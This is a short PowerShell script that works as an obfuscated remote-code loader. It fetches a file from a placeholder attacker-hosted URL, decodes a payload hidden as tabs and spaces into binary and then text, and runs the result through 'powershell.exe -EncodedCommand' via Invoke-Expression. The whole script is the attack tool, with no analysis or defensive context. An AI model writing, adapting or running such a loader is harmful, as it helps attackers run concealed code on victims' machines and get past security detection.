# URL of the tabs and spaces file
$tabsSpacesURL = "<http://YOUR_HOSTED_TABBY_PAYLOAD>"

# Fetch tabs and spaces content from the URL
$tabsSpacesData = (Invoke-WebRequest -Uri $tabsSpacesURL).Content

# Convert tabs and spaces to binary
$binaryData = $tabsSpacesData.Replace(" ", "0").Replace("`t", "1")

# Decode binary data to text
$textData = ""
for ($i = 0; $i -lt $binaryData.Length; $i += 8) {
    $textData += [char][convert]::ToInt32($binaryData.Substring($i, 8), 2)
}

# Convert text data to base64
$base64TextData = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($textData))

# Execute the final base64 output
$encodedCommand = "powershell.exe -EncodedCommand $base64TextData"
Invoke-Expression $encodedCommand
